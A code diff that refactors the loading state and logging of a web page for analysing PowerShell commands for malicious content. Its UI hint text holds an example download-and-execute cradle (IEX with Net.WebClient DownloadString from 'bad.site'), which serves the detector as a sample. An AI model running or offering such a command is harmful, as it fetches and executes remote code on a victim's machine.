@@ -50,6 +50,7 @@ export default function AnalysisDetailsPage() {
   const [result, setResult] = useState(null);
   const [cmd, setCmd] = useState("");
   const [loading, setLoading] = useState(true);
+  const [newAnalysisLoading, setNewAnalysisLoading] = useState(false);
   const [error, setError] = useState("");
   const [newCommand, setNewCommand] = useState("");
   const analysisExecutedRef = useRef(false);
@@ -108,18 +109,9 @@ export default function AnalysisDetailsPage() {
 
   // Função para análise de novo comando (reutilizada da página original)
   const performAnalysis = async (command, ipAddress, ipLocation) => {
-    
     try {
-      setLoading(true);
+      setNewAnalysisLoading(true);
       setError("");
-      
-      // Garantir que o skeleton apareça por pelo menos 800ms para UX
-      const minDelay = new Promise(resolve => setTimeout(resolve, 800));
-      
-      // Timeout de 15 segundos para análise
-      const timeoutPromise = new Promise((_, reject) =>
-        setTimeout(() => reject(new Error('Analysis timeout - taking too long')), 15000)
-      );
       
       // Obter ou criar sessão anônima
       const sessionId = getOrCreateSession();
@@ -141,87 +133,58 @@ export default function AnalysisDetailsPage() {
       // Chamar a API Python diretamente
       const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:8000';
       
-      const analysisPromise = fetch(`${apiUrl}/analyze-pcre2`, {
+      const response = await fetch(`${apiUrl}/analyze-pcre2`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(requestData)
-      }).then(async response => {
-        const data = await response.json();
-        console.log('📥 [ANALYSIS PAGE] Resposta da API:', data);
-        
-        // Verificar se precisa de rate limiting
-        const needsHandling = handleRateLimitResponse(response, data);
-        
-        if (needsHandling) {
-          console.log('⚠️ [ANALYSIS PAGE] Rate limit necessário');
-          throw new Error('Rate limit excedido');
-        }
-        
-        if (!response.ok) {
-          console.log('❌ [ANALYSIS PAGE] Erro HTTP:', response.status, data);
-          throw new Error(data.error || `HTTP error! status: ${response.status}`);
-        }
-        
-        return data;
-      }).catch(error => {
-        console.log('❌ [ANALYSIS PAGE] Erro na chamada da API:', error);
-        if (error.message === 'Rate limit excedido') {
-          throw error;
-        }
-        throw new Error(`Erro da API: ${error.message}`);
       });
       
-      // Executar análise e delay mínimo em paralelo
-      const [response] = await Promise.all([
-        Promise.race([analysisPromise, timeoutPromise]),
-        minDelay
-      ]);
+      const data = await response.json();
       
-      console.log('✅ [ANALYSIS PAGE] Análise concluída com sucesso:', response);
+      // Verificar se precisa de rate limiting
+      const needsHandling = handleRateLimitResponse(response, data);
       
-      if (response.success) {
-        const analysisData = response.analysis;
-        console.log('📊 [ANALYSIS PAGE] Dados da análise:', analysisData);
+      if (needsHandling) {
+        setNewAnalysisLoading(false);
+        return;
+      }
+      
+      if (!response.ok) {
+        throw new Error(data.error || `HTTP error! status: ${response.status}`);
+      }
+      
+      if (data.success) {
+        const analysisData = data.analysis;
         
         // Salvar session_id retornado pelo backend
-        if (response.session_id && !user?.id) {
-          console.log('💾 [ANALYSIS PAGE] Salvando session_id do backend:', response.session_id);
-          saveSessionFromBackend(response.session_id);
+        if (data.session_id && !user?.id) {
+          saveSessionFromBackend(data.session_id);
         }
         
-        // Salvar análise anônima em cookies se não estiver logado (ANTES do redirecionamento)
+        // Salvar análise anônima em cookies se não estiver logado
         if (!user?.id) {
           try {
-            console.log('🍪 [ANALYSIS PAGE] Salvando análise anônima em cookies...');
             saveAnonymousAnalysis({
               command: command,
               score: analysisData.risk_score,
               severity: analysisData.is_malicious ? "malicious" : "safe",
               signatures: analysisData.signatures_detected || [],
               cmdlets_detected: analysisData.cmdlets_detected || [],
-              analysis_id: response.analysis_id
+              analysis_id: data.analysis_id
             });
-            console.log('✅ [ANALYSIS PAGE] Análise anônima salva em cookies');
           } catch (error) {
-            console.log('❌ [ANALYSIS PAGE] Erro ao salvar análise anônima:', error);
+            console.error('Error saving anonymous analysis:', error);
           }
         }
         
-        // Se temos um analysis_id, redirecionar para a página específica da análise
-        if (response.analysis_id) {
-          console.log('🔄 [ANALYSIS PAGE] Redirecionando para análise:', response.analysis_id);
-          console.log('🔔 [ANALYSIS PAGE] Chamando notifyNewAnalysis...');
-          
-          // Notificar que uma nova análise foi feita ANTES do redirecionamento
+        // Se temos um analysis_id, redirecionar imediatamente
+        if (data.analysis_id) {
+          // Notificar que uma nova análise foi feita
           notifyNewAnalysis();
           
-          console.log('⏳ [ANALYSIS PAGE] Aguardando 100ms antes do redirecionamento...');
-          // Pequeno delay para garantir que o evento seja processado
-          setTimeout(() => {
-            console.log('🚀 [ANALYSIS PAGE] Executando redirecionamento...');
-            router.push(`/analysis/${response.analysis_id}`);
-          }, 100);
-          return;
+          // Redirecionar imediatamente para evitar stutter
+          router.push(`/analysis/${data.analysis_id}`);
+          return; // Sair da função imediatamente
         }
 
         const analysisResult = {
@@ -242,18 +205,16 @@ export default function AnalysisDetailsPage() {
         throw new Error(response.error || 'Analysis failed');
       }
     } catch (err) {
-      console.log('❌ [ANALYSIS PAGE] Erro geral:', err);
-      
+      // Handle rate limit errors gracefully
       if (err.message === 'Rate limit excedido') {
-        setLoading(false);
+        setNewAnalysisLoading(false);
         return;
       }
       
       setError(err.message);
       setResult(null);
     } finally {
-      setLoading(false);
-      console.log('🏁 [ANALYSIS PAGE] performAnalysis finalizado');
+      setNewAnalysisLoading(false);
     }
   };
   
@@ -262,29 +223,24 @@ export default function AnalysisDetailsPage() {
   
   // Handle new command analysis
   const handleNewAnalysis = async () => {
-    console.log('🚀 [ANALYSIS PAGE] handleNewAnalysis chamado com comando:', newCommand.trim());
-    
     if (newCommand.trim()) {
       // Verificar se já atingiu rate limit antes de prosseguir
       if (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit) {
-        console.log('⚠️ [ANALYSIS PAGE] Rate limit atingido');
-        setError("Rate limit atingido. Aguarde o timer ou resolva o captcha.");
+        setError("Rate limit reached. Wait for timer or solve captcha.");
         return;
       }
       
-      console.log('✅ [ANALYSIS PAGE] Rate limit OK, prosseguindo com análise');
+      // Reset analysis flag
       analysisExecutedRef.current = false;
       
-      // Limpar apenas o erro, mas manter o resultado atual para evitar flick
+      // Clear error but keep current result to avoid flicker
       setError("");
       
-      console.log('🔄 [ANALYSIS PAGE] Chamando performAnalysis...');
-      // Executar nova análise diretamente
+      // Perform new analysis - this will handle loading state and redirect
       await performAnalysis(newCommand.trim(), null, {});
       
-      // Limpar o campo de input apenas se a análise foi bem-sucedida
+      // Clear input field only if analysis was successful
       setNewCommand("");
-      console.log('✅ [ANALYSIS PAGE] handleNewAnalysis finalizado');
     }
   };
 
@@ -307,18 +263,28 @@ export default function AnalysisDetailsPage() {
               onChange={(e) => setNewCommand(e.target.value)}
               onSubmit={handleNewAnalysis}
               placeholder="Type or paste a PS payload..."
-              disabled={loading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
+              disabled={newAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
             />
           </div>
           <ThemedButton
             onClick={handleNewAnalysis}
-            disabled={!newCommand.trim() || loading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
+            disabled={!newCommand.trim() || newAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
             className="flex-shrink-0"
-            loading={loading}
+            loading={newAnalysisLoading}
           >
-            {loading ? 'Analyzing...' : 'Evaluate'}
+            {newAnalysisLoading ? 'Analyzing...' : 'Evaluate'}
           </ThemedButton>
         </div>
+        
+        {/* Loading overlay for new analysis */}
+        {newAnalysisLoading && (
+          <div className="mt-4 p-4 rounded-lg border bg-black/80 border-green-500/30 text-center">
+            <LoadingSpinner />
+            <p className="mt-2 font-mono text-sm" style={{color: 'var(--muted-foreground)'}}>
+              Analyzing new command...
+            </p>
+          </div>
+        )}
         <InfoMessage 
           message={!error && newCommand.trim() === "" ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
           clickable={!error && newCommand.trim() === ""}
